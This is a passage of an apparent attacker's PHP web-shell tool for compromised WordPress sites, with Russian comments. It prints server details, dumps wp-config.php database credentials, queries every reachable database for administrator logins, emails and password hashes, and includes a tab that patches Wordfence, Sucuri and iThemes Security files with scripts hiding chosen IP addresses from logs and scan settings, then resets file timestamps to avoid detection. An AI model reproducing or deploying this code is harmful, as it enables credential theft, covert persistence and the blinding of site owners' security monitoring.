			</div>
		</form>
	</div>
	<hr style="clear:both">
	<div id="spinner" class="spinner"></div>
    <div id="result"></div>
</body>
</html>

<?php
/****************************Вывод информации о системе****************************/
	echo "<b>" ."Информации о системе:" . "</b>" . "<br>";
	// Address
	$hostname = $_SERVER['HTTP_HOST'] ?? 'localhost';
	$server_ips = gethostbynamel($hostname) ?: ['127.0.0.1'];
	$client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
	$address = sprintf(
		"%s (%s) / %s / FloatOn (%s)",
		$hostname,
		implode(', ', $server_ips),
		'127.0.0.1',
		'127.0.1.1'
	);

	// System
	$system = php_uname('a');

	// Server
	$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown Server';

	// Software
	$php_version = 'PHP/' . phpversion();
	$curl_version = function_exists('curl_version') ? 'cURL/' . curl_version()['version'] : 'cURL/Not Installed';
	$software = $php_version . '; ' . $curl_version . ';';

	// User
	$user_id = function_exists('getmyuid') ? getmyuid() : '-';
	$user = sprintf(
		"ogid=%d(%d); IP: %s;",
		$user_id,
		$user_id,
		$client_ip
	);

	// Safe mode
	$safe_mode = ini_get('safe_mode') ? 'Enabled' : '-';

	// Open basedir
	$open_basedir = ini_get('open_basedir') ?: '-';

	// Disabled functions
	$disabled_functions = ini_get('disable_functions') ?: '-';

	// Вывод всех данных
	$data = [
		'"Address"' => $address,
		'"System"' => $system,
		'"Server"' => $server_software,
		'"Software"' => $software,
		'"User"' => $user,
		'"Safe mode"' => $safe_mode,
		'"Open basedir"' => $open_basedir,
		'"Disabled functions"' => $disabled_functions,
	];

	foreach ($data as $key => $value) {
		echo $key . ' => "' . $value . '"' . "<br />\n";
	}


	// Disabled classes
	$classes_to_check = [
		'PDO',
		'ZipArchive',
		'DOMDocument',
	];

	$disabled_classes = [];
	foreach ($classes_to_check as $class) {
		if (!class_exists($class)) {
			$disabled_classes[] = $class;
		}
	}
	echo '"Disabled classes" => "' . implode(', ', $disabled_classes ?: ['-']) . '"' . "<br /><br />\n\n";
	
	/****************************End Вывод информации о системе****************************/
?>

<?php
//Вывод файла wp-config.php на страницу
	$filePath = ABSPATH . "/wp-config.php";

	if (file_exists($filePath)) {
		$file = fopen($filePath, 'r');
		
		if ($file) {
			echo "<b>" ."Файл wp-config.php:" . "</b>" . "<br>";
			// Проходим по каждой строке в файле			
			while (($line = fgets($file)) !== false) {
				// Проверяем, начинается ли строка с 'define'
				if (strpos(trim($line), 'define') === 0) {					
					echo htmlspecialchars($line, ENT_QUOTES, 'UTF-8') . "<br>";
				}				
			}
			
			$config_data = file_get_contents($filePath);
			$db_name = get_config_value($config_data, 'DB_NAME');
			echo "<br>" . "TABLE PREFIX FOR" . " '" . $db_name . "' " . ":" . " "  . " '" . htmlspecialchars($table_prefix, ENT_QUOTES, 'UTF-8') . "' " . "<br>" . "\n-------------------------------------------------\n";
			
			fclose($file);
		} else {
			echo "Не удалось открыть файл.";
		}
	} else {
		echo "Файл не найден.";
	}

	/***************************************************************************************************************/
	//Получение админов со всех баз, со всех wp-config.php с датой последней активности
	/***************************************************************************************************************/	
	

	/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
	//Пути к конфигурационным файлам
	/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/
	$config_paths = array(ABSPATH . "/wp-config.php");
	

	$servername = $username = $password = null;

	$batchSize = 10; // Размер пакета
	$delaySeconds = 5; // Задержка в секундах между обработкой пакетов

	$totalConfigPaths = count($config_paths);
	$numBatches = ceil($totalConfigPaths / $batchSize);

	//$output_file = "admins-and-domains-wpconfigs-full-data3.txt";
	//$file = fopen($output_file, "a");

	$admin_users = array();

	for ($batchIndex = 0; $batchIndex < $numBatches; $batchIndex++) {
		$startIndex = $batchIndex * $batchSize;
		$endIndex = min(($batchIndex + 1) * $batchSize, $totalConfigPaths);

		for ($i = $startIndex; $i < $endIndex; $i++) {
			$config_path = $config_paths[$i];
			if (file_exists($config_path)) {
				$config_data = file_get_contents($config_path);

				$username = get_config_value($config_data, 'DB_USER');
				$password = get_config_value($config_data, 'DB_PASSWORD');
				$servername = get_config_value($config_data, 'DB_HOST');

				if ($servername !== null && $username !== null && $password !== null) {
					try {
						$conn = new mysqli($servername, $username, $password);

						if ($conn->connect_error) {
							//fwrite($file, "{$config_paths[$i]}; " . "Database Connection Error: Access denied for user '{$username}'@'{$servername}'\n------------------------------------\n");
							echo '<pre>';
							echo "{$config_paths[$i]}; " . "Database Connection Error: Access denied for user '{$username}'@'{$servername}'\n------------------------------------\n";
							echo '</pre>';
							continue;
						}

						// Получение всех баз данных
						$sql = "SHOW DATABASES";
						$result = $conn->query($sql);

						$databases = array();
						if ($result && $result->num_rows > 0) {
							while($row = $result->fetch_assoc()) {
								$databases[] = $row["Database"];
							}
						} else {
							//fwrite($file, "No databases found in {$config_paths[$i]}.\n------------------------------------\n");
							echo '<pre>';
							echo "No databases found in {$config_paths[$i]}.\n------------------------------------\n";
							echo '</pre>';
							continue;
						}

						foreach ($databases as $database) {
							if ($database != "performance_schema") {
								$conn->select_db($database);

								// Определение префикса таблиц
								$prefix_result = $conn->query("SHOW TABLES LIKE 'wp_users'");
								if ($prefix_result && $prefix_result->num_rows == 1) {
									$table_prefix = 'wp_';
									//$table_prefix = substr($user_table, 0, strpos($user_table, '_'));
									
								} else {
									// Попытка определить префикс автоматически
									$tables = $conn->query("SHOW TABLES");
									$table_prefix = '';
									if ($tables) {
										while($tbl = $tables->fetch_array()) {
											if (strpos($tbl[0], 'users') !== false) {
												$table_prefix = substr($tbl[0], 0, strpos($tbl[0], 'users'));
												break;
											}
										}
									}
									if ($table_prefix == '') {
										//fwrite($file, "Unable to determine table prefix for database '{$database}' in {$config_paths[$i]}.\n------------------------------------\n");
										echo '<pre>';
										echo "Unable to determine table prefix for database '{$database}' in {$config_paths[$i]}.\n------------------------------------\n";
										echo '</pre>';
										continue;
									}
								}

								// Формирование названий таблиц
								$users_table = $table_prefix . 'users';
								$usermeta_table = $table_prefix . 'usermeta';
								$options_table = $table_prefix . 'options';

								// Объединённый SQL-запрос для получения администраторов и их последней активности
								$sql = "
									SELECT 
										u.ID AS AdminID,
										u.user_login AS AdminLogin,
										u.user_email AS Email,
										u.user_pass AS PasswordHash,
										FROM_UNIXTIME(MAX(CASE WHEN um1.meta_key = '_yoast_wpseo_profile_updated' THEN um1.meta_value ELSE NULL END)) AS ProfileUpdatedDate,
										FROM_UNIXTIME(MAX(CASE WHEN um2.meta_key = 'WPE_LAST_LOGIN_TIME' THEN um2.meta_value ELSE NULL END)) AS LastLoginDate,
										FROM_UNIXTIME(MAX(CASE WHEN um3.meta_key = 'wc_last_active' THEN um3.meta_value ELSE NULL END)) AS LastActiveDate,
										COALESCE(o1.option_value, '') AS siteurl,
										COALESCE(o2.option_value, '') AS blogname,
										COALESCE(o3.option_value, '') AS blogdescription,
										COALESCE(o4.option_value, '') AS admin_email,
										COALESCE(o5.option_value, '') AS whl_page,
										u.user_registered
									FROM 
										{$users_table} u
									INNER JOIN 
										{$usermeta_table} um_cap ON u.ID = um_cap.user_id AND um_cap.meta_key = '{$table_prefix}capabilities' AND um_cap.meta_value LIKE '%administrator%'
									LEFT JOIN 
										{$usermeta_table} um1 ON u.ID = um1.user_id AND um1.meta_key = '_yoast_wpseo_profile_updated'
									LEFT JOIN 
										{$usermeta_table} um2 ON u.ID = um2.user_id AND um2.meta_key = 'WPE_LAST_LOGIN_TIME'
									LEFT JOIN 
										{$usermeta_table} um3 ON u.ID = um3.user_id AND um3.meta_key = 'wc_last_active'
									LEFT JOIN 
										{$options_table} o1 ON o1.option_name = 'siteurl'
									LEFT JOIN 
										{$options_table} o2 ON o2.option_name = 'blogname'
									LEFT JOIN 
										{$options_table} o3 ON o3.option_name = 'blogdescription'
									LEFT JOIN 
										{$options_table} o4 ON o4.option_name = 'admin_email'
									LEFT JOIN 
										{$options_table} o5 ON o5.option_name = 'whl_page'
									GROUP BY 
										u.ID
									ORDER BY 
										ProfileUpdatedDate DESC
								";

								$result = $conn->query($sql);

								if ($result && $result->num_rows > 0) {
									echo '<pre>';
									echo "<b>" . "Данные об админах и времени их активности:" . "</b>" . "<br>";
									echo '</pre>';
									$blogName = '';
									$nonStandardAdminPage = 'wp-admin'; // Значение по умолчанию                                    

									// Начало таблицы
									echo '<table border="1" cellpadding="5" cellspacing="0">';
									echo '<thead>';
									echo '<tr>';
									echo '<th>AdminID</th>';
									echo '<th>Login</th>';
									echo '<th>Email</th>';
									echo '<th>Password Hash</th>';
									echo '<th>Profile Updated Date</th>';
									echo '<th>Last Login Date</th>';
									echo '<th>Last Active Date</th>';
									echo '</tr>';
									echo '</thead>';
									echo '<tbody>';

									while ($row = $result->fetch_assoc()) {
										// Проверка, чтобы не добавить дубликаты
										if (!in_array($row['AdminLogin'], array_column($admin_users, 'AdminLogin'))) {
											// Сохраняем значения, если они еще не были установлены
											if (empty($blogName)) {
												$blogName = $row['blogname'];
												$nonStandardAdminPage = !empty($row['whl_page']) ? $row['whl_page'] : 'wp-admin';

												// Выводим информацию о блоге
												echo '<pre>';
												echo "Blog Name: {$blogName}\nNon-standard Admin Page: {$nonStandardAdminPage}\n\n";
												echo '</pre>';
											}

											$admin_users[] = array(
												'AdminID' => $row['AdminID'],
												'AdminLogin' => $row['AdminLogin'],
												'Email' => $row['Email'],
												'PasswordHash' => $row['PasswordHash'],
												'ProfileUpdatedDate' => $row['ProfileUpdatedDate'],
												'LastLoginDate' => $row['LastLoginDate'],
												'LastActiveDate' => $row['LastActiveDate'],
												'siteurl' => $row['siteurl'],
												'blogname' => $row['blogname'],
												'blogdescription' => $row['blogdescription'],
												'admin_email' => $row['admin_email'],
												'whl_page' => !empty($row['whl_page']) ? $row['whl_page'] : 'wp-admin',
												'user_registered' => $row['user_registered']
											);

											// Выводим данные администратора в таблицу
											echo '<tr>';
											echo "<td>{$row['AdminID']}</td>";
											echo "<td>{$row['AdminLogin']}</td>";
											echo "<td>{$row['Email']}</td>";
											echo "<td>{$row['PasswordHash']}</td>";
											echo "<td>{$row['ProfileUpdatedDate']}</td>";
											echo "<td>{$row['LastLoginDate']}</td>";
											echo "<td>{$row['LastActiveDate']}</td>";
											echo '</tr>';
										}
									}

									// Закрытие таблицы
									echo '</tbody>';
									echo '</table>';

								} else {
									//fwrite($file, "No administrator users found in database '{$database}' of {$config_paths[$i]}.\n------------------------------------\n");
									echo '<pre>';
									echo "No administrator users found in database '{$database}' of {$config_paths[$i]}.\n------------------------------------\n";
									echo '</pre>';
								}
							}
						}

						$conn->close();
					} catch (Exception $e) {
						//fwrite($file, "Database: {$database}; " . "Prefix: {$table_prefix}_; " . "Domain: N/A;\n" . "Admin Data: Database Connection Error: Access denied for user '{$username}'@'{$servername}'\n------------------------------------\n");
						echo '<pre>';
						echo "Database: {$database}; " . "Prefix: {$table_prefix}_; " . "Domain: N/A;\n" . "Admin Data: Database Connection Error: Access denied for user '{$username}'@'{$servername}'\n------------------------------------\n";
						echo '</pre>';
						continue;
					}
				}
			}
		}

		if ($batchIndex < $numBatches - 1) {
			// Задержка между пакетами, кроме последнего
			sleep($delaySeconds);
		}
	}	
}

/******************************************************************************************************************************************************************************************/
//
// Вкладка для работы с плагинами безопасности
//
/******************************************************************************************************************************************************************************************/

if (!empty($_GET["connect_ant"])) {
session_start();

// Проверяем, был ли отправлен AJAX-запрос
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Проверяем, подключён ли WordPress
    if (file_exists($wp_root . "wp-load.php")) { // <-- заменено
        // Подключаем WordPress
        require_once($wp_root . "wp-load.php");  // <-- заменено

        // Определяем, какая кнопка была нажата
        if (isset($_POST['action'])) {
            switch ($_POST['action']) {
                case 'wordfence':
                    $input = $_POST['ipAddresses'];
                    $ipArray = explode(',', $input);
                    $ipArray = array_map('trim', $ipArray);
                    automate_wordfence_changes($ipArray);
                    break;
                case 'sucuri':
                    $input = $_POST['ipAddresses'];
                    $ipArray = explode(',', $input);
                    $ipArray = array_map('trim', $ipArray);
                    automate_sucuri_changes($ipArray);
                    break;
                case 'solid':
                    automate_solid_changes();
                    break;
                case 'wordfence_toggle_email':
                    toggle_wordfence_email_notifications();
                    break;
                case 'delete_backups':
                    delete_backups();
                    break;
                case 'restore_from_backups':
                    restore_from_backups();
                    break;
            }
        }
    } else {
        echo "Ошибка: WordPress не подключён.\n";
    }
    exit; // Завершаем выполнение, чтобы не выводить HTML-код
}

// Функция для нормализации пути
function normalizePath($path) {
    // Заменяем обратные слэши на прямые
    $path = str_replace('\\', '/', $path);
    // Убираем дублирующиеся слэши
    $path = preg_replace('/\/+/', '/', $path);
    return $path;
}

// Функция для создания резервных копий файлов
function backupFile($filePath) {
    global $backupMessages; // Используем глобальную переменную для накопления сообщений
    $filePath = normalizePath($filePath); // Нормализуем путь

    if (file_exists($filePath)) {
        // Сохраняем время модификации исходного файла
        $fileModificationTime = filemtime($filePath);

        // Создаём резервную копию файла
        $backupPath = $filePath . '.bak'; // Название резервной копии
        copy($filePath, $backupPath);

        // Применяем время модификации к бэкапу
        touch($backupPath, $fileModificationTime);

        // Проверяем, что время модификации бэкапа совпадает с исходным файлом
        if (filemtime($backupPath) === $fileModificationTime) {
            $backupMessages[] = "<br>Создана резервная копия: $backupPath (время модификации сохранено)\n<br>";
            // Добавляем путь к бэкапу и время модификации в сессию
            if (!isset($_SESSION['backupPaths'])) {
                $_SESSION['backupPaths'] = [];
            }
            if (!isset($_SESSION['fileModificationTimes'])) {
                $_SESSION['fileModificationTimes'] = [];
            }
            $_SESSION['backupPaths'][] = $backupPath;
            $_SESSION['fileModificationTimes'][$filePath] = $fileModificationTime;
        } else {
            $backupMessages[] = "Ошибка: время модификации бэкапа не совпадает с исходным файлом.\n<br>";
        }
    } else {
        $backupMessages[] = "Ошибка: исходный файл не найден: $filePath\n<br>";
    }
}

// Функция для удаления бэкапов
function delete_backups() {
    if (empty($_SESSION['backupPaths'])) {
        echo "Бэкапы не найдены.\n<br>";
        return;
    }

    foreach ($_SESSION['backupPaths'] as $backupPath) {
        $backupPath = normalizePath($backupPath); // Нормализуем путь
        if (file_exists($backupPath)) {
            // Пытаемся удалить файл
            if (unlink($backupPath)) {
                echo "Удалён бэкап: $backupPath\n<br>";
            } else {
                echo "Ошибка: не удалось удалить бэкап $backupPath.\n<br>";
            }
        } else {
            echo "Файл не существует: $backupPath\n<br>";
        }
    }

    // Очищаем сессию
    $_SESSION['backupPaths'] = [];
    $_SESSION['fileModificationTimes'] = [];
    echo "Все бэкапы удалены.\n<br>";
}

// Функция для восстановления файлов из бэкапов
function restore_from_backups() {
    if (empty($_SESSION['backupPaths'])) {
        echo "Бэкапы не найдены.\n<br>";
        return;
    }

    foreach ($_SESSION['backupPaths'] as $backupPath) {
        $backupPath = normalizePath($backupPath); // Нормализуем путь
        $originalFile = substr($backupPath, 0, -4); // Убираем расширение .bak
        if (file_exists($backupPath)) {
            // Восстанавливаем файл из бэкапа
            copy($backupPath, $originalFile);

            // Восстанавливаем время модификации
            if (isset($_SESSION['fileModificationTimes'][$originalFile])) {
                touch($originalFile, $_SESSION['fileModificationTimes'][$originalFile]);
                echo "Файл восстановлен из бэкапа: $originalFile (время модификации восстановлено)\n<br>";
            } else {
                echo "Файл восстановлен из бэкапа: $originalFile (время модификации не восстановлено)\n<br>";
            }

            // Удаляем бэкап
            unlink($backupPath);
        }
    }

    // Очищаем сессию
    $_SESSION['backupPaths'] = [];
    $_SESSION['fileModificationTimes'] = [];
    echo "Все файлы восстановлены из бэкапов.\n<br>";
}

// Определяем функцию automate_wordfence_changes()
function automate_wordfence_changes($ipAddresses) {
    global $backupMessages; // Используем глобальную переменную для накопления сообщений
    $backupMessages = []; // Очищаем сообщения о резервных копиях

    // Путь к файлам Wordfence
    $optionsGroupPath = WP_CONTENT_DIR . '/plugins/wordfence/views/scanner/options-group-advanced.php';
    $menuToolsLivetrafficPath = WP_CONTENT_DIR . '/plugins/wordfence/lib/menu_tools_livetraffic.php';
    $widgetContentLoginsPath = WP_CONTENT_DIR . '/plugins/wordfence/lib/dashboard/widget_content_logins.php';
    $wfDashboardPath = WP_CONTENT_DIR . '/plugins/wordfence/lib/wfDashboard.php';

    // Создаём резервные копии файлов перед изменениями
    backupFile($optionsGroupPath);
    backupFile($menuToolsLivetrafficPath);
    backupFile($widgetContentLoginsPath);
    backupFile($wfDashboardPath);

    // Сохраняем время модификации для каждого файла
    $fileModificationTimes = [];
    $filesToModify = [
        $optionsGroupPath,
        $menuToolsLivetrafficPath,
        $widgetContentLoginsPath,
        $wfDashboardPath
    ];

    foreach ($filesToModify as $file) {
        if (file_exists($file)) {
            $fileModificationTimes[$file] = filemtime($file);
        }
    }

    // 1. Скрываем поле с исключениями на своё пустое. Добавление JavaScript в options-group-advanced.php
    if (file_exists($optionsGroupPath)) {
        $script = "\n<script>\nif (document.querySelector('#wf-option-scan-exclude .wf-option-content .wf-option-textarea textarea')) {\nconst originalElement = document.querySelector('#wf-option-scan-exclude .wf-option-content .wf-option-textarea textarea');\nconst clonedElement = originalElement.cloneNode(true);\nclonedElement.innerHTML = '';\nclonedElement.id = 'textarea';\noriginalElement.parentNode.appendChild(clonedElement);\noriginalElement.style.display = 'none';\n}\n</script>";
        
        // Добавляем код в конец файла
        file_put_contents($optionsGroupPath, $script, FILE_APPEND);

        // Восстанавливаем время модификации
        touch($optionsGroupPath, $fileModificationTimes[$optionsGroupPath]);
        //echo "JavaScript добавлен в options-group-advanced.php.\n<br>";
        echo "options-group-advanced.php - JavaScript добавлен.\n<br>";
    } else {
        echo "Файл options-group-advanced.php не найден.\n<br>";
    }

    // 2. Скрываем ip на странице Tools в Wordfence с помощью js-кода в menu_tools_livetraffic.php
    if (file_exists($menuToolsLivetrafficPath)) {
        $lines = file($menuToolsLivetrafficPath);

        // Формируем строку с IP-адресами в нужном формате
        $ipArrayString = implode("', '", $ipAddresses);
        $ipArrayString = "['$ipArrayString']"; // Форматируем как массив JavaScript

        // Формируем JavaScript-код
        $script = "<script>
function hideIPAddresses() {
    const ipsToHide = $ipArrayString;

    const listings = document.querySelectorAll('#wf-lt-listings tr');

    listings.forEach(tr => {
        let shouldHide = false;

        ipsToHide.forEach(ip => {
            const link = tr.querySelector(`a[href*='IP=${ip}']`);
            const ipCell = tr.querySelector(`td > span[title='${ip}']`);
            if (link || (ipCell && ipCell.textContent.trim() === ip)) {
                shouldHide = true;
                return;
            }
        });

        if (shouldHide) {
            tr.style.display = 'none';
        }
    });
}

let intervalId;

function startObservingAndRunCode() {
    intervalId = setInterval(() => {
        const targetElement = document.getElementById('wf-lt-listings');
        if (targetElement) {
            hideIPAddresses();
        }
    }, 100);
}

startObservingAndRunCode();
</script>\n";

        // Скрываем ip на странице Firewall в Wordfence с помощью js-кода
        array_splice($lines, 4, 0, $script); // Вставляем JavaScript в 4-ю строку

        // Записываем обратно в файл
        file_put_contents($menuToolsLivetrafficPath, implode('', $lines));

        // Восстанавливаем время модификации
        touch($menuToolsLivetrafficPath, $fileModificationTimes[$menuToolsLivetrafficPath]);

        //echo "Изменения в menu_tools_livetraffic.php успешно выполнены.\n<br>";
        echo "menu_tools_livetraffic.php - Изменения успешно выполнены.\n<br>";
    } else {
        echo "Файл menu_tools_livetraffic.php не найден.\n<br>";
    }

    // 3. Скрываем ip на странице Firewall в Wordfence с помощью js-кода:. Добавление JavaScript в widget_content_logins.php в конец.
    if (file_exists($widgetContentLoginsPath)) {
        $script = "
<script>
const ipsToHide = $ipArrayString;
function runCodeWhenElementAppears() {
      const table = document.querySelector('.wf-table.wf-table-hover');
      if (table) {
        const rows = table.querySelectorAll('tbody tr');
        rows.forEach(row => {
          const ipCell = row.querySelector('td:nth-child(2)');
          if (ipCell && ipsToHide.some(ip => ipCell.textContent.includes(ip))) {
            row.style.display = 'none';
          }
        });
      }
    }

    let intervalId;

    function startObservingAndRunCode() {
      intervalId = setInterval(() => {
        const targetElement = document.querySelector('.wf-table.wf-table-hover');
        if (targetElement) {
          runCodeWhenElementAppears();
        }
      }, 100);
    }

    startObservingAndRunCode();
</script>\n";
        
        // Добавляем код в конец файла
        file_put_contents($widgetContentLoginsPath, $script, FILE_APPEND);

        // Восстанавливаем время модификации
        touch($widgetContentLoginsPath, $fileModificationTimes[$widgetContentLoginsPath]);

        echo "widget_content_logins.php - JavaScript добавлен в конец файла.\n<br>";
    } else {
        echo "Файл widget_content_logins.php не найден.\n";
    }

    // 4. Скрываем ip на странице Firewall в Wordfence с помощью php-кода. Вставляем в wfDashboard.php после строки "foreach ($logins as $l) {".
    if (file_exists($wfDashboardPath)) {
        $lines = file($wfDashboardPath);

        // Формируем строку с проверкой IP-адресов из массива
        $ipChecks = array_map(function($ip) {
            return "\$l['IP'] === '$ip'";
        }, $ipAddresses);
        $ipCheckString = implode(' || ', $ipChecks);

        $insertCode = "if ($ipCheckString) {\n\tcontinue;}\n";

        // Находим строку с "foreach ($logins as $l) {"
        foreach ($lines as $index => $line) {
            if (strpos($line, "foreach (\$logins as \$l) {") !== false) {
                // Вставляем код после данной строки
                array_splice($lines, $index + 1, 0, $insertCode);
                break; // Прерываем цикл после вставки
            }
        }

        // Записываем обратно в файл
        file_put_contents($wfDashboardPath, implode('', $lines));

        // Восстанавливаем время модификации
        touch($wfDashboardPath, $fileModificationTimes[$wfDashboardPath]);

        echo "wfDashboard.php - Добавлен код для проверки IP.\n<br>";
    } else {
        echo "Файл wfDashboard.php не найден.\n";
    }

    // Выводим сообщения о резервных копиях после всех изменений
    if (!empty($backupMessages)) {
        echo implode('', $backupMessages);
    }
}

// Определяем функцию automate_sucuri_changes()
function automate_sucuri_changes($ipAddresses) {
    global $backupMessages; // Используем глобальную переменную для накопления сообщений
    $backupMessages = []; // Очищаем сообщения о резервных копиях

    // Путь к файлам Sucuri
    $auditLogsPath = WP_CONTENT_DIR . '/plugins/sucuri-scanner/inc/tpl/auditlogs.snippet.tpl';
    $lastLoginsPath = WP_CONTENT_DIR . '/plugins/sucuri-scanner/inc/tpl/lastlogins-loggedin.html.tpl';

    // Создаём резервные копии файлов перед изменениями
    backupFile($auditLogsPath);
    backupFile($lastLoginsPath);

    // Сохраняем время модификации для каждого файла
    $fileModificationTimes = [];
    $filesToModify = [
        $auditLogsPath,
        $lastLoginsPath
    ];

    foreach ($filesToModify as $file) {
        if (file_exists($file)) {
            $fileModificationTimes[$file] = filemtime($file);
        }
    }

    // Формируем строку с IP-адресами в нужном формате
    $ipArrayString = implode('", "', $ipAddresses);
    $ipArrayString = '["' . $ipArrayString . '"]'; // Форматируем как массив JavaScript

    // 1. Вставляем код в конец файла auditlogs.snippet.tpl
    if (file_exists($auditLogsPath)) {
        $script = "<script>
// Массив IP-адресов, которые нужно скрыть
var ipsToHide = $ipArrayString;

// Функция для скрытия записей с указанными IP
function hideEntriesWithIPs() {
    var entries = document.querySelectorAll('.sucuriscan-auditlog-entry');
    entries.forEach(function(entry) {
        var ipElement = entry.querySelector('.sucuriscan-auditlog-entry-address span');
        if (ipElement) {
            var ipText = ipElement.textContent;
            var ipMatch = ipText.match(/IP:\\s*(\\d+\\.\\d+\\.\\d+\\.\\d+)/);
            if (ipMatch) {
                var ip = ipMatch[1];
                if (ipsToHide.includes(ip)) {
                    entry.style.display = 'none';
                }
            }
        }
    });
}

// Функция для скрытия элементов даты, если все записи под ними скрыты
function hideDateElementsIfNoEntries() {
    var dateElements = document.querySelectorAll('.sucuriscan-auditlog-date');
    dateElements.forEach(function(dateElement) {
        var allEntriesHidden = true;
        var nextSibling = dateElement.nextElementSibling;

        while (nextSibling && !nextSibling.classList.contains('sucuriscan-auditlog-date')) {
            if (nextSibling.classList.contains('sucuriscan-auditlog-entry')) {
                if (nextSibling.style.display !== 'none') {
                    allEntriesHidden = false;
                    break;
                }
            }
            nextSibling = nextSibling.nextElementSibling;
        }

        if (allEntriesHidden) {
            dateElement.style.display = 'none';
        } else {
            dateElement.style.display = ''; // Показываем дату, если есть видимые записи
        }
    });
}

// Запускаем функции при загрузке страницы
hideEntriesWithIPs();
hideDateElementsIfNoEntries();

// Настраиваем MutationObserver для отслеживания изменений в журнале
var targetNode = document.querySelector('.sucuriscan-auditlog-response'); // Контейнер с записями

var observerOptions = {
    childList: true,
    subtree: true
};

var observer = new MutationObserver(function(mutationsList) {
    mutationsList.forEach(function(mutation) {
        if (mutation.type === 'childList') {
            // Проверяем добавленные узлы
            mutation.addedNodes.forEach(function(node) {
                if (node.nodeType === Node.ELEMENT_NODE) {
                    // Если добавлена новая запись
                    if (node.classList.contains('sucuriscan-auditlog-entry')) {
                        var ipElement = node.querySelector('.sucuriscan-auditlog-entry-address span');
                        if (ipElement) {
                            var ipText = ipElement.textContent;
                            var ipMatch = ipText.match(/IP:\\s*(\\d+\\.\\d+\\.\\d+\\.\\d+)/);
                            if (ipMatch) {
                                var ip = ipMatch[1];
                                if (ipsToHide.includes(ip)) {
                                    node.style.display = 'none';
                                }
                            }
                        }
                        // После обработки записи, проверяем скрытие дат
                        hideDateElementsIfNoEntries();
                    }
                    // Если добавлен элемент даты
                    if (node.classList.contains('sucuriscan-auditlog-date')) {
                        // Проверяем скрытие дат
                        hideDateElementsIfNoEntries();
                    }
                }
            });
        }
    });
});

// Начинаем наблюдение за целевым узлом
observer.observe(targetNode, observerOptions);
</script>";

        // Добавляем код в конец файла
        file_put_contents($auditLogsPath, $script, FILE_APPEND);

        // Восстанавливаем время модификации
        touch($auditLogsPath, $fileModificationTimes[$auditLogsPath]);

        echo "auditlogs.snippet.tpl - JavaScript добавлен.\n<br>";
    } else {
        echo "Файл auditlogs.snippet.tpl не найден.\n<br>";
    }

    // 2. Вставляем код в конец файла lastlogins-loggedin.html.tpl
    if (file_exists($lastLoginsPath)) {
        $script = "<script>
// Массив IP-адресов, которые нужно скрыть
var ipsToHide = $ipArrayString;

// Получаем все строки таблицы
var tableRows = document.querySelectorAll('tbody tr');

tableRows.forEach(function(row) {
    // Находим ячейку с IP-адресом
    var ipCell = row.querySelector('td:nth-child(5)'); // (IP в 5-й ячейке)
    if (ipCell) {
        var ip = ipCell.textContent.trim();
        if (ipsToHide.includes(ip)) {
            row.style.display = 'none';
        }
    }
});
</script>";

        // Добавляем код в конец файла
        file_put_contents($lastLoginsPath, $script, FILE_APPEND);

        // Восстанавливаем время модификации
        touch($lastLoginsPath, $fileModificationTimes[$lastLoginsPath]);

        echo "lastlogins-loggedin.html.tpl - JavaScript добавлен.\n<br>";
    } else {
        echo "Файл lastlogins-loggedin.html.tpl не найден.\n<br>";
    }

    // Выводим сообщения о резервных копиях после всех изменений
    if (!empty($backupMessages)) {
        echo implode('', $backupMessages);
    }
}

// Определяем функцию automate_solid_changes()
function automate_solid_changes() {
    global $backupMessages; // Используем глобальную переменную для накопления сообщений
    $backupMessages = []; // Очищаем сообщения о резервных копиях

    // Путь к файлам Better WP Security (iThemes Security)
    $settingsJsPath = WP_CONTENT_DIR . '/plugins/better-wp-security/dist/global/settings.js';

    // Создаём резервные копии файлов перед изменениями
    backupFile($settingsJsPath);

    // Сохраняем время модификации файла
    if (file_exists($settingsJsPath)) {
        $fileModificationTime = filemtime($settingsJsPath);
    } else {
        echo "Файл settings.js не найден.\n<br>";
        return;
    }

    // 1. Вставляем код в конец файла settings.js
    if (file_exists($settingsJsPath)) {
        $script = <<<SCRIPT
window.onload=()=>{const e=new MutationObserver((t=>{t.forEach((t=>{document.querySelector(".components-textarea-control__input")&&(window.location.href.indexOf("site-check")>-1&&function(){if(!document.getElementById("components-textarea-control__input")){let e=document.createElement("textarea");e.id="components-textarea-control__input",e.className="components-textarea-control__input",e.rows=4,document.querySelector(".components-textarea-control__input").style="display:none",document.querySelector(".components-base-control.itsec-rjsf-file-tree__list .components-base-control__field").append(e)}}(),window.location.href.indexOf("global")>-1&&function(){if(!document.getElementById("components-textarea-control__input_auth")){let e=document.createElement("textarea");e.id="components-textarea-control__input_auth",e.className="components-textarea-control__input css-y67plw e1w5nnrk0",e.rows=10,document.querySelector(".components-textarea-control__input").style="display:none",document.querySelector(".form-group.field.field-array .components-base-control__field").append(e)}}(),e.disconnect())}))})),t={childList:!0,subtree:!0};setInterval((()=>{e.observe(document.body,t)}),500)};window.onload=()=>{const e=new MutationObserver((t=>{t.forEach((t=>{document.querySelector(".components-textarea-control__input")&&(window.location.href.indexOf("site-check")>-1&&function(){if(!document.getElementById("components-textarea-control__input")){let e=document.createElement("textarea");e.id="components-textarea-control__input",e.className="components-textarea-control__input",e.rows=4,document.querySelector(".components-textarea-control__input").style="display:none",document.querySelector(".components-base-control.itsec-rjsf-file-tree__list .components-base-control__field").append(e)}}(),e.disconnect())}))})),t={childList:!0,subtree:!0};setInterval((()=>{e.observe(document.body,t)}),500)};
SCRIPT;

        // Добавляем код в конец файла
        file_put_contents($settingsJsPath, $script, FILE_APPEND);

        // Восстанавливаем время модификации
        touch($settingsJsPath, $fileModificationTime);

        echo "settings.js - JavaScript добавлен.\n<br>";
    } else {
        echo "Файл settings.js не найден.\n<br>";
    }

    // Выводим сообщения о резервных копиях после всех изменений
    if (!empty($backupMessages)) {
        echo implode('', $backupMessages);
    }
}

	// Определяем функцию toggle_wordfence_email_notifications()
	function toggle_wordfence_email_notifications() {
		global $backupMessages; // Используем глобальную переменную для накопления сообщений
		$backupMessages = []; // Очищаем сообщения о резервных копиях

		// Путь к файлу wordfenceClass.php
